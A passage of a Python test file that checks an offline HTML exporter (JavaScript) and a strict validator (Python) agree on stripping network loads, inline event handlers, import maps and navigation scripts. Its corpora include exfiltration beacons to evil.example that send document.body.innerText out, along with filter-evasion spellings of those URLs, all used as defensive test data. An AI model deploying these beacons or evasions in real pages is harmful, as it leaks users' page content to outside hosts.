            decls[0],
            r'catch \(e\) \{\s*return _cmhHrefIsDocumentReference\(a\.getAttribute\("href"\)\);',
            "the link classifier's unparseable-href branch no longer returns the shared string "
            "reading of the anchor's own href attribute. `a.protocol` is \":\" for an anchor whose "
            "URL record is null, so reading it leaves `http://[` unstamped while the CMH-LINK-05 "
            "gate calls the same href a document reference (#1183).")

    def test_the_python_and_js_unparseable_href_verdicts_agree(self):
        """The render-time link classifier (JS) and the new-tab gate (Python) must agree about an
        href the URL parser cannot resolve.

        This is the divergence #1183 exists because of: the gate classifies `http://[` on the string
        and calls it a document reference, while the runtime's fallback read `a.protocol`, got ":",
        and left the link unstamped - so the gate warned about a same-tab link the runtime never
        actually protected. Run in node rather than re-implemented here, for the same reason the
        effective-target pair is: the two engines disagree about whitespace and about what their own
        URL parser rejects, and an engine difference is exactly what this pins. Skipped when node is
        absent, like the other node-gated checks.
        """
        expected = [links_check._is_document_reference(href)
                    for href, _base in self._UNPARSEABLE_HREF_CORPUS]
        # A corpus that answered one way for every row would pin nothing while staying green.
        self.assertIn(True, expected, "no corpus row is a document reference")
        self.assertIn(False, expected, "no corpus row is a non-document reference")
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        script = (
            self._runtime_document_reference_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify(p.corpus.map(r=>{"
            "let threw=false;try{new URL(r[0],r[1]);}catch(e){threw=true;}"
            "return [threw,_cmhHrefIsDocumentReference(r[0])];})));});"
        )
        proc = subprocess.run(
            [node, "-e", script],
            input=json.dumps({"corpus": [list(r) for r in self._UNPARSEABLE_HREF_CORPUS]}),
            capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the document-reference reading: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._UNPARSEABLE_HREF_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._UNPARSEABLE_HREF_CORPUS)))
        for (href, base), (threw, js_says), py_says in zip(self._UNPARSEABLE_HREF_CORPUS,
                                                           verdicts, expected):
            self.assertTrue(threw,
                            "href %r now RESOLVES against base %r, so it no longer reaches the "
                            "classifier's fallback branch and this row pins nothing; replace it "
                            "with one the URL parser still refuses" % (href, base))
            self.assertEqual(
                js_says, py_says,
                "unresolvable href %r is %s a document reference in the runtime and %s one in the "
                "validator. A link only one of them stamps is either a same-tab navigation the "
                "gate warns about and the runtime never prevents, or a non-document link the "
                "runtime newly opens in a dead tab."
                % (href, "" if js_says else "not", "" if py_says else "not"))

    def test_the_python_and_js_href_readings_agree_beyond_the_unresolvable_corpus(self):
        """The mirror holds for the hrefs the unresolvable corpus cannot carry.

        Its rows must all make `new URL()` fail, so the `""`/`#fragment` short-circuit, the ASCII
        case fold on the scheme, and the scheme regex's exclusion of `/`, `?` and `#` are asserted
        by prose alone otherwise - drop the `.toLowerCase()` and every other new test stays green.
        Same node evaluation, same extracted region, no resolvability precondition.
        """
        expected = [links_check._is_document_reference(href) for href in self._HREF_READING_CORPUS]
        self.assertIn(True, expected, "no corpus row is a document reference")
        self.assertIn(False, expected, "no corpus row is a non-document reference")
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        script = (
            self._runtime_document_reference_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(v=>_cmhHrefIsDocumentReference(v))));});"
        )
        proc = subprocess.run([node, "-e", script],
                              input=json.dumps({"corpus": self._HREF_READING_CORPUS}),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the document-reference reading: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._HREF_READING_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._HREF_READING_CORPUS)))
        for href, js_says, py_says in zip(self._HREF_READING_CORPUS, verdicts, expected):
            self.assertEqual(js_says, py_says,
                             "href %r is %s a document reference in the runtime and %s one in the "
                             "validator" % (href, "" if js_says else "not",
                                            "" if py_says else "not"))

    def test_the_python_and_js_parked_base_corpora_are_identical(self):
        """The two readers' parked-`<base>` corpora are hand-copied markup lists, so pin their TEXT.

        The effective-target parity test pins the pure COMBINE function, whose `base` operand is
        already resolved. The resolution itself is now a real implementation on each side - the
        validator's `_DocParser.base_targets` (parser state: namespace, template and shadow rules)
        and the runtime's `querySelectorAll("base[target]")` plus a namespace filter - and nothing
        makes them agree except being checked against the same document shapes. A shape added to one
        list and forgotten in the other silently leaves one reader unchecked on it.
        """
        js = self._read_test("74-links.spec.js")
        m = re.search(r"const PARKED_BASES = \[\n(.*?)\n\];", js, re.S)
        self.assertIsNotNone(m, "74-links.spec.js no longer declares PARKED_BASES; the parity pin "
                                "must be re-pointed at whatever corpus replaced it")
        js_shapes = re.findall(r"^\s*'(.*?)',$", m.group(1), re.M)
        self.assertEqual(len(js_shapes), len(m.group(1).strip().splitlines()),
                         "a PARKED_BASES entry is not a single-quoted one-line literal, so the "
                         "extraction read a partial corpus")
        py = self._read_test("test_validate_kql.py")
        m = re.search(r"PARKED_BASES = \(\n(.*?)\n    \)", py, re.S)
        self.assertIsNotNone(m, "test_validate_kql.py no longer declares PARKED_BASES")
        py_shapes = re.findall(r"^\s*'(.*?)',$", m.group(1), re.M)
        self.assertEqual(js_shapes, py_shapes,
                         "the runtime is checked against %r and the validator against %r; a shape "
                         "only one of them stages is a `<base>` only one reader is known to read "
                         "the way a browser does" % (js_shapes, py_shapes))

    def test_the_python_and_js_link_relation_tokenizers_are_textually_identical(self):
        """The `rel` separator class is a hand-copied literal in two languages, so pin its TEXT.

        Verdicts over a corpus cannot see a class that drifted on a character the corpus does not
        carry, and this class exists precisely because each engine's own whitespace is wrong here.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"const _OFFLINE_REL_WS_RE = /(.*?)/;", source)
        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_REL_WS_RE; the parity pin "
                                "must be re-pointed at whatever tokenizes `rel` now")
        self.assertEqual(m.group(1), parsing.LINK_REL_WS_RE.pattern,
                         "the exporter splits a `rel` list on %r while the validator splits on %r; "
                         "a character only one of them treats as a separator makes one side see a "
                         "relation the other cannot" % (m.group(1), parsing.LINK_REL_WS_RE.pattern))

    def test_the_python_and_js_fetching_link_predicates_agree(self):
        """The offline strip (JS) and the strict validator (Python) must call the SAME `<link>` a
        fetching one.

        Run in node rather than re-implemented here, for the same reason the CSS pair is: the two
        engines disagree about whitespace and case folding, and an engine difference is exactly
        what this pins. Skipped when node is absent, like the other node-gated checks.
        """
        for rel, expected in self._LINK_REL_CORPUS:
            self.assertEqual(
                resources._link_loads({"rel": rel}), expected,
                "the validator reads rel=%r as %s. A miss is a network <link> it certifies as "
                "offline-clean; a false hit rejects a file the exporter just produced."
                % (rel, "not fetching" if expected else "fetching"))
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {"corpus": [rel for rel, _ in self._LINK_REL_CORPUS]}
        script = (
            self._runtime_link_rel_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.corpus.map(s=>_offlineLinkLoads(s))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the link-relation predicate: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._LINK_REL_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._LINK_REL_CORPUS)))
        for (rel, expected), js_says in zip(self._LINK_REL_CORPUS, verdicts):
            self.assertEqual(
                js_says, expected,
                "the exporter reads rel=%r as %s, so the strip and the gate have diverged. A link "
                "only one of them calls fetching is either a live network load the gate blesses or "
                "an exported file its own --strict run rejects."
                % (rel, "fetching" if js_says else "not fetching"))

    # Attribute-name spellings the two `^on` predicates must agree about. `once`/`onward` are
    # deliberately in the MATCHED set: the exporter's test is literally `/^on/i`, so an attribute
    # merely starting with those two letters is stripped, and a validator that were cleverer than
    # the strip would BLESS an attribute the export takes away.
    _EVENT_HANDLER_ATTR_CORPUS = [
        "onclick", "ONLOAD", "OnClick", "on", "onerror", "onbeforeunload",
        "once", "onward", "o", "n", "", "click", "data-onclick", "xlink:onload",
        " onload", "onload ", "\ton", "o n", "0n", "ON", "oN",
        # Unicode near-misses: Python's str.lower() is Unicode-aware and JS `/i` folds by its own
        # table, so a fullwidth or dotted spelling must be a MISS on both sides, not just one.
        "\uff2f\uff2eclick", "\u0130Nclick", "\u212ao", "\u017fn",
    ]

    def test_the_python_and_js_event_handler_predicates_agree(self):
        """The offline strip (JS) and the strict validator (Python) must call the SAME attribute an
        inline event handler.

        The gap this closes is the CMH-OFFLINE-04 drift shape: the exporter scrubs every `on*`
        attribute, and the validator's offline mode rejects one, so an attribute only ONE of them
        calls a handler is either a live handler the gate blesses or an exported file its own
        `--strict` run rejects. The two are independent spellings (`/^on/i` versus a `[:2].lower()`
        test), and Python's `str.lower()` is Unicode-aware where a JS `/i` regex folds by its own
        table, so the comparison runs the RUNTIME's regex in the real engine rather than
        re-implementing it here. Skipped when node is absent, like the other node-gated checks.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        source = self._read("68-export-offline.js")
        scrub = re.search(r"function _stripOfflineEventHandlers\(doc\) \{(.*?)\n\}", source, re.S)
        self.assertIsNotNone(scrub, "the runtime no longer declares _stripOfflineEventHandlers; "
                                    "the parity check is stale and must be re-pointed at whatever "
                                    "replaced it")
        m = re.search(r"if \(/(.+?)/i\.test\(attr\.name", scrub.group(1))
        self.assertIsNotNone(m, "the event-handler scrub no longer tests attribute names with an "
                                "inline /^on/i regex; the parity check is stale and must be "
                                "re-pointed at whatever replaced it")
        # The pattern is only half the decision: a scrub that kept `/^on/i` but guarded the removal
        # (the shape someone reaches for when they decide `once` should survive after all) would
        # leave both parity tests green while the strip and the gate disagreed - and the exporter's
        # own `--strict` run would then reject the file it had just produced.
        self.assertRegex(scrub.group(1),
                         r'if \(/[^\n/]*/i\.test\(attr\.name \|\| ""\)\) el\.removeAttribute\(attr\.name\);',
                         "the scrub no longer removes the attribute unconditionally on a name "
                         "match; this check compares only the NAME test, so re-point it at "
                         "whatever now decides removal")
        payload = {"pattern": m.group(1), "corpus": self._EVENT_HANDLER_ATTR_CORPUS}
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);const re=new RegExp(p.pattern,'i');"
            "process.stdout.write(JSON.stringify(p.corpus.map(s=>re.test(String(s||'')))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the event-handler pattern: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(self._EVENT_HANDLER_ATTR_CORPUS),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(self._EVENT_HANDLER_ATTR_CORPUS)))
        for name, js_says in zip(self._EVENT_HANDLER_ATTR_CORPUS, verdicts):
            self.assertEqual(
                js_says, parsing._is_event_handler_attr(name),
                "the runtime's event-handler scrub and the validator's "
                "_is_event_handler_attr disagree about %r. An attribute only one of them calls a "
                "handler is either a live handler the gate blesses, or an exported file its own "
                "--strict run rejects." % name)

    def test_the_validator_handler_view_reaches_what_the_scrub_walk_reaches(self):
        """The two sides must also LOOK in the same places, not just agree on the attribute name.

        This pins the PYTHON half exactly - the validator's view really does reach a self-closed
        foreign element, a `<noscript>` body and a nested-template element - and pins the JS half
        only to the extent a source read can: that the scrub still walks
        `_offlineQueryAll(doc, "*")`, the helper whose own recursion into `<template>` content is
        covered by the offline Playwright spec. It deliberately does NOT claim to execute the
        scrub's walk; a rewrite that keeps that call but changes what it descends would pass here
        and be caught by `tests/49-offline-export.spec.js`, which round-trips these shapes through
        the real exporter in a browser.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"function _stripOfflineEventHandlers\(doc\) \{(.*?)\n\}", source, re.S)
        self.assertIsNotNone(m, "the runtime no longer declares _stripOfflineEventHandlers")
        self.assertIn("_offlineQueryAll(doc, \"*\")", m.group(1),
                      "the event-handler scrub no longer walks _offlineQueryAll(doc, \"*\"); the "
                      "validator's egress-index view is pinned to that walk, so update both "
                      "together")
        html = ('<div id="commentRoot">'
                '<svg><rect onload="x()"/></svg>'
                '<noscript><button onclick="x()">go</button></noscript>'
                '<template><template><img onerror="x()"></template></template>'
                "</div>")
        seen = {(h["tag"], h["attr"]) for h in parsing._find_event_handler_attrs_egress(html)}
        self.assertEqual(seen, {("rect", "onload"), ("button", "onclick"), ("img", "onerror")},
                         "the validator's handler view no longer reaches every element the "
                         "exporter's DOM walk does: %r" % sorted(seen))

    # (type, attrs, body) tuples the exporter REMOVES and the validator rejects.
    _ACTIVE_DATA_REMOVED = [
        # A ruleset goes whatever it says: `"source": "document"` prefetches the document's own
        # links with no URL literal, so no URL-shaped rule could gate one.
        ("speculationrules", {}, '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
        ("speculationrules", {}, '{"prefetch": [{"source": "document"}]}'),
        ("speculationrules", {}, '{"prerender": [{"urls": ["next.html"]}]}'),
        ("speculationrules", {"src": "rules.json"}, ""),
        ("importmap", {}, '{"imports": {"lib": "https://evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "//evil.example/lib.js"}}'),
        # A backslash opens an authority for a special scheme exactly as a slash does, in either
        # position, and from a `file:` document that is a UNC fetch.
        ("importmap", {}, '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "\\\\/evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "\\\\\\\\evil.example/lib.js"}}'),
        # JSON spells the same URL many ways, and the URL parser strips padding and an embedded
        # tab, so a text scan closes one spelling and leaves the rest.
        ("importmap", {}, '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
        # A data:/blob: target maps a bare specifier onto code the document never carried.
        ("importmap", {}, '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
        ("importmap", {}, '{"imports": {"lib": "blob:https://evil.example/x"}}'),
        # A scopes KEY is a reference too.
        ("importmap", {}, '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
        ("importmap", {"src": "map.json"}, '{"imports": {"lib": "./lib.js"}}'),
        # A browser hard-fails an unparseable map, so failing closed loses nothing. Python's json
        # accepts NaN/Infinity by default and JSON.parse does not, so those must fail closed too.
        ("importmap", {}, "not json at all"),
        ("importmap", {}, ""),
        ("importmap", {}, '{"imports": {"lib": NaN}}'),
    ]
    # ...and the ones both must KEEP, so the rule cannot quietly become "delete every block".
    _ACTIVE_DATA_KEPT = [
        ("importmap", {}, '{"imports": {"lib": "./lib.js", "app": "/app.js"}}'),
        ("importmap", {}, '{"imports": {"lib": "../vendor/lib.js"}}'),
        # A `//` that does not START the reference is not an authority.
        ("importmap", {}, '{"imports": {"a": "./b//c.js"}}'),
        ("importmap", {}, '{"scopes": {"/inner/": {"lib": "./inner.js"}}}'),
        ("importmap", {}, "{}"),
    ]
    # Type normalization: these are HTML KEYWORD types, not MIME types, so a browser matches them
    # exactly after trimming ASCII whitespace. A parameterized spelling is inert data.
    _ACTIVE_DATA_TYPE_CASES = [
        ("importmap", "importmap"),
        ("  IMPORTMAP\t", "importmap"),
        ("speculationrules", "speculationrules"),
        ("SpeculationRules", "speculationrules"),
        ("importmap;charset=utf-8", ""),
        ("speculationrules; x=1", ""),
        ("module", ""),
        ("application/json", ""),
        ("text/javascript", ""),
        ("", ""),
    ]

    def _runtime_const(self, source, name):
        """One runtime `const NAME = [...];` declaration, as JS source, for evaluation in node."""
        m = re.search(r"^const %s = \[.*?\];$" % re.escape(name), source, re.M)
        self.assertIsNotNone(m, "the runtime no longer declares %s on one line; the parity "
                                "extraction is stale and must be re-pointed at whatever replaced "
                                "it" % name)
        return m.group(0)

    def _runtime_string_const(self, source, name):
        """One runtime `const NAME = "...";` declaration, as JS source, for evaluation in node."""
        m = re.search(r'^const %s = "[^"]*";$' % re.escape(name), source, re.M)
        self.assertIsNotNone(m, "the runtime no longer declares %s as a one-line string; the "
                                "parity extraction is stale and must be re-pointed at whatever "
                                "replaced it" % name)
        return m.group(0)

    def _runtime_fn(self, source, name):
        """One runtime function, as JS source, for evaluation in node.

        Extracted rather than re-implemented in Python: a re-implementation keeps passing after the
        runtime drifts, which is the whole failure the parity tests exist to catch.
        """
        start = source.find("function %s(" % name)
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines %s; the parity extraction is stale and "
                            "must be re-pointed at whatever replaced it" % name)
        end = source.find("\n}", start)
        self.assertNotEqual(end, -1, "could not find the end of %s" % name)
        region = source[start:end + 2]
        # The `\n}` terminator is a contract with the formatter (a column-0 closing brace and no
        # column-0 inner one). A truncation is usually LOUD - node fails to parse the fragment - but
        # a reformat could in principle truncate to something still valid, so check the balance here
        # rather than trusting the shape. The count is over the RAW text, so it also assumes an
        # extracted function carries no brace inside a string, comment or regex literal; none of
        # them does today, and a future one that must would need this guard taught about literals
        # rather than loosened.
        self.assertEqual(region.count("{"), region.count("}"),
                         "the extracted source of %s is not brace-balanced, so the `\\n}` "
                         "terminator truncated it (or ran past it); re-point the extraction, "
                         "restore the column-0 closing brace, or - if %s legitimately carries a "
                         "brace inside a string or regex literal - teach this guard to blank "
                         "literals before counting" % (name, name))
        return region

    def _runtime_active_data_source(self):
        """The exporter's whole active-data decision, as JS source, for evaluation in node.

        Extracted as one contiguous region rather than re-implemented: the decision is four parts
        (type normalization, the `src` rule, the JSON parse and the recursive walk), and a Python
        re-implementation would keep passing after any of them drifted - which is exactly the drift
        the parity test exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("const _OFFLINE_ACTIVE_DATA_TYPES = [")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _OFFLINE_ACTIVE_DATA_TYPES; the parity "
                            "extraction is stale")
        end = source.find("function _offlineActiveDataBlockIsRemovable(", start)
        self.assertNotEqual(end, -1,
                            "the runtime no longer defines _offlineActiveDataBlockIsRemovable "
                            "after the type list; the parity extraction is stale")
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1, "could not find the end of _offlineActiveDataBlockIsRemovable")
        region = source[start:end + 2]
        for name in ("_offlineActiveDataScriptType", "_OFFLINE_NONLOCAL_REF_RE",
                     "_offlineIsNonLocalRef", "_offlineJsonHasNonLocalRef"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted active-data region, so the parity "
                          "check would run a partial copy of the decision" % name)
        return region

    def test_the_python_and_js_active_data_block_rules_agree(self):
        """The offline strip (JS) and the strict validator (Python) must treat `speculationrules`
        and `importmap` blocks identically, judged by running the REAL JS.

        Neither type is JavaScript, so the runnable-type predicate never looked at either - yet a
        speculation ruleset makes the browser fetch on its own (a `"source": "document"` one names
        no URL at all, which is why it is removed unconditionally) and an import map re-points
        where a bare module specifier resolves, which the literal `import "https://..."` scan
        structurally cannot see. Two independent copies of the rule are exactly the drift the
        runnable-script-type parity test exists for: a validator that recognized less would bless a
        file the exporter strips, and one that recognized more would reject the file it just
        produced. Both directions are pinned - a removed corpus AND a kept corpus - so the rule can
        neither weaken into "nothing is active" nor widen into "delete every block". The exporter's
        own source is evaluated in node, because compiling it with Python's `re`/`json` could only
        ever prove what PYTHON does with it and structurally cannot catch an engine difference.
        """
        self.assertEqual(
            tuple(re.findall(r'"([^"]+)"',
                             re.search(r"^const _OFFLINE_ACTIVE_DATA_TYPES = \[(.+?)\];$",
                                       self._read("68-export-offline.js"), re.MULTILINE).group(1))),
            tuple(resources.OFFLINE_ACTIVE_DATA_TYPES),
            "the exporter's _OFFLINE_ACTIVE_DATA_TYPES and the validator's "
            "OFFLINE_ACTIVE_DATA_TYPES have diverged - a type only one of them knows about is "
            "either an unstripped active block the gate blesses, or a false rejection")
        for raw, expected in self._ACTIVE_DATA_TYPE_CASES:
            self.assertEqual(resources.offline_active_data_script_type({"type": raw}), expected,
                             "the validator normalizes the script type %r wrongly" % raw)
        for stype, attrs, body in self._ACTIVE_DATA_REMOVED:
            self.assertTrue(resources.offline_active_data_block_is_removable(stype, attrs, body),
                            "the validator no longer rejects %r %r %r" % (stype, attrs, body))
        for stype, attrs, body in self._ACTIVE_DATA_KEPT:
            self.assertFalse(resources.offline_active_data_block_is_removable(stype, attrs, body),
                             "the validator now rejects the local block %r %r %r" % (stype, attrs, body))

        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {
            "types": [raw for raw, _ in self._ACTIVE_DATA_TYPE_CASES],
            "removed": [[t, sorted(a), b] for t, a, b in self._ACTIVE_DATA_REMOVED],
            "kept": [[t, sorted(a), b] for t, a, b in self._ACTIVE_DATA_KEPT],
        }
        script = (
            self._runtime_active_data_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "const el=(attrs,body)=>({hasAttribute:(n)=>attrs.indexOf(n)!==-1,textContent:body});"
            "const decide=([t,attrs,body])=>{const k=_offlineActiveDataScriptType(t);"
            "return k?_offlineActiveDataBlockIsRemovable(k,el(attrs,body)):null;};"
            "process.stdout.write(JSON.stringify({"
            "types:p.types.map(_offlineActiveDataScriptType),"
            "removed:p.removed.map(decide),kept:p.kept.map(decide)}));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the active-data decision: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        # Length-check before zipping: `zip` truncates silently, so a short list would let this
        # pass having asserted nothing.
        for key, corpus in (("types", self._ACTIVE_DATA_TYPE_CASES),
                            ("removed", self._ACTIVE_DATA_REMOVED),
                            ("kept", self._ACTIVE_DATA_KEPT)):
            self.assertEqual(len(verdicts.get(key, [])), len(corpus),
                             "node returned %d %s verdicts for %d samples"
                             % (len(verdicts.get(key, [])), key, len(corpus)))
        for (raw, expected), got in zip(self._ACTIVE_DATA_TYPE_CASES, verdicts["types"]):
            self.assertEqual(got, expected,
                             "the REAL JS engine normalizes the script type %r to %r, and the "
                             "validator to %r" % (raw, got, expected))
        for sample, hit in zip(self._ACTIVE_DATA_REMOVED, verdicts["removed"]):
            self.assertTrue(hit, "the REAL JS engine no longer removes %r, so the exporter ships a "
                                 "block the Python validator rejects" % (sample,))
        for sample, hit in zip(self._ACTIVE_DATA_KEPT, verdicts["kept"]):
            self.assertFalse(hit, "the REAL JS engine now deletes the local block %r" % (sample,))

    _NAV_CORPUS_NAVIGATES = [
        'location.href = "https://evil.example/steal?d=" + document.body.innerText;',
        "\nlocation = 'https://evil.example';",
        'window.location.href="//evil.example/beacon";',
        "top.location.replace('https://evil.example')",
        'document.location.assign("https://evil.example")',
        "self.location.href = `https://evil.example`",
        'parent.location.href = "http://evil.example"',
        'globalThis.location.href =\n  "https://evil.example"',
        'window.location = "https://evil.example"',
        'window.open( "//evil.example/popup" )',
        'self.open("https://evil.example")',
        'LOCATION.HREF = "HTTPS://EVIL.EXAMPLE"',
        # A prefix CHAIN, not just one prefix - `window.` in front used to clear the strip.
        'window.top.location.href = "https://evil.example"',
        'window.parent.location.href = "https://evil.example"',
        'self.top.location = "https://evil.example"',
        # Optional chaining, in forms that are VALID JavaScript. (An optional-chain ASSIGNMENT
        # such as `window?.location.href = <url>` is a SyntaxError and navigates nothing, so
        # pinning it would only prove the regex matches dead source.)
        'window?.open("https://evil.example")',
        'location?.assign("https://evil.example")',
        'window.location?.assign("https://evil.example")',
        'window ?. open ( "https://evil.example" )',
        # `frames` (=== window) is a real top-level navigation.
        'frames.location.href = "https://evil.example"',
        # The natural arrow-function beacon, and a bare assignment inside a block.
        'setTimeout(() => location = "https://evil.example/?" + document.body.innerText)',
        'if (x) {\n  location = "https://evil.example";\n}',
        'if (x) location = "https://evil.example";',
        # Shadowing does NOT rescue a PREFIXED sink: `window.location` names the real one no matter
        # what a local `location` shadows, so these must still be stripped.
        'const location = {}; window.location.href = "https://evil.example";',
        'const location = {}; top.location.replace("https://evil.example");',
        'const location = {}; window.open("https://evil.example");',
        # A name that merely CONTAINS `location` declares no binding at all, so an unprefixed sink
        # beside it still navigates the real document. The shadow rule reads raw source, so it has
        # to insist on a boundary at BOTH ends of the name and of the keyword: without the leading
        # one, an ordinary `newLocation` parameter or `currentLocation` destructuring bought the
        # whole script the shadowed treatment; without a boundary after the keyword, the optional
        # function-name slot absorbed the tail of a longer word. Either one let this beacon past
        # with a one-token rename.
        'function updateLocation(newLocation) { location.href = "https://evil.example"; }',
        'var { currentLocation } = opts; location.href = "https://evil.example";',
        'functionx(location); location.href = "https://evil.example";',
        # JS treats U+FEFF as whitespace; Python's `\\s` does not, so a shared class let this
        # valid-JS beacon be stripped by the exporter yet certified clean by the validator.
        'location.href =\ufeff"https://evil.example"',
        # A SCHEME-ONLY URL literal - no slashes after the scheme. A browser resolves
        # `https:evil.example/x` to `https://evil.example/x`, so this beacons exactly as well as
        # the shapes above while needing no aliasing, no computed access and no runtime assembly.
        'location.href = "https:evil.example/steal?d=" + document.body.innerText;',
        "\nlocation = 'https:evil.example';",
        'window.location.href = "https:evil.example"',
        'top.location.replace("https:evil.example")',
        'document.location.assign(`http:evil.example`)',
        'window.open("https:evil.example/popup")',
        'const location = {}; window.location.href = "https:evil.example";',
        # A URL literal the BROWSER NORMALIZES before it resolves it. Every one of these is spelled
        # with characters that are LITERALLY in the source - no string escape, no aliasing, no
        # runtime assembly - so a raw scan can see them, and each resolves to the same network host
        # the plain spelling would.
        # (a) Leading C0-or-space padding, which the URL parser strips before it parses anything.
        'location.href = " https://evil.example/steal";',
        "window.location.href = '\u0001https://evil.example'",
        'top.location.replace("  https:evil.example")',
        # (b) ASCII tab / LF / CR, which the URL parser removes from ANYWHERE in the input. A real
        # tab is legal inside an ordinary string literal and a real newline inside a template one,
        # so splitting the scheme costs an attacker one keystroke.
        'location.href = "ht\ttps://evil.example"',
        'window.open("ht\ttps://evil.example/popup")',
        'document.location.assign(`ht\ntps://evil.example`)',
        'location.href = "/\t/evil.example"',
        # (c) A backslash where a slash is expected: for a special scheme the URL parser treats the
        # two alike, so either authority slash can be written as a slash, an escaped slash, or an
        # escaped backslash.
        r'location.href = "\\\\evil.example"',
        r'window.location = "\//evil.example"',
        r'top.location.replace("/\\evil.example")',
        # (d) A JavaScript LineContinuation - a backslash followed by a line terminator - evaluates
        # to NOTHING, so it pads the literal or splits the scheme without the URL parser having to
        # remove anything. It is fully visible in raw source and needs no decoder, unlike the
        # character escapes the CMH-OFFLINE-05 residual keeps.
        'location.href = "\\\nhttps://evil.example/steal";',
        'window.location.href = "ht\\\rtps://evil.example"',
        'top.location.replace(`\\\u2028https:evil.example`)',
        'location.href = "/\\\n/evil.example"',
        # (e) A backslash before a character that starts no escape sequence is a
        # NonEscapeCharacter: it evaluates to that character, so a single backslash anywhere in the
        # scheme (or before the padding) is erased by the JS parser and the URL is unchanged. That
        # is one keystroke and needs no decoder, so it is closed rather than left residual.
        'location.href = "\\https://evil.example/steal";',
        'window.location.href = "htt\\ps://evil.example"',
        'top.location.replace("https\\://evil.example")',
        'document.location.assign("\\ https://evil.example")',
        'location.href = "\\htt\\ps\\://evil.example"',
        # A non-ASCII WHITESPACE character is a BOUNDARY, not an identifier character. The boundary
        # class treats every OTHER non-ASCII character as part of an identifier, so the whitespace
        # set has to be carved back out of it - widening to "any non-ASCII character" would stop
        # seeing a real sink that merely sits one exotic space away from the start of the script.
        '\u00a0location.href = "https://evil.example"',
        '\u3000window.location.href = "https://evil.example"',
        '\u1680location.replace("https://evil.example")',
    ]
    # Benign shapes that must SURVIVE. The strip deletes a whole script, so a false positive
    # silently breaks an author's document - the costlier direction of the two.
    _NAV_CORPUS_BENIGN = [
        # Comparisons, not assignments - a document that merely INSPECTS its own URL.
        'if (location.href === "https://evil.example") return;',
        'if (location.href !== "https://evil.example") return;',
        # A network literal and a navigation object in the same script, never joined.
        'var DOCS = "https://docs.example.org/guide"; if (location.hash) document.title = DOCS;',
        # A LOCAL binding that merely happens to be called `location` (a config value, a geocode
        # result). Assigning a URL to it navigates nothing.
        'var location = "https://api.example.com/v1";',
        'const location = "https://docs.example.org/x";',
        'let location = "https://docs.example.org/x";',
        'function f() { var location = "https://evil.example"; return location; }',
        # A local helper called `open` - `open("...")` alone is not the global navigation sink.
        'open("https://docs.example.org/guide")',
        'const open = mk(); open("https://docs.example.org/guide")',
        'xhr.open("GET", "https://evil.example")',
        'myopen("https://evil.example")',
        # Purely LOCAL bindings that merely default to a URL. These navigate nothing, and deleting
        # the whole script over them is the costlier failure direction.
        'function f(location = "https://cdn.example.com/x") { return location; }',
        'const { location = "https://cdn.example.com/x" } = opts;',
        'var a = 1, location = "https://cdn.example.com/x";',
